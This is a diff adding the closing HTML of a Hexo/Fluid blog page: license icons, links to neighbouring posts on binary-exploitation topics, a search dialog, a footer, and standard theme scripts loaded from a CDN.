+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by-nc-nd/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by-nc-nd/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="NC - 非商业性使用">
+                    <i class="iconfont icon-cc-nc"></i>
+                  </span>
+                </a>
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by-nc-nd/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="ND - 禁止演绎">
+                    <i class="iconfont icon-cc-nd"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2019/07/21/Unsorted-Bin-Attack/" title="Unsorted Bin Attack">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Unsorted Bin Attack</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2019/07/17/ret2-dl-runtime-resolve/" title="ret2_dl_runtime_resolve">
+                        <span class="hidden-mobile">ret2_dl_runtime_resolve</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
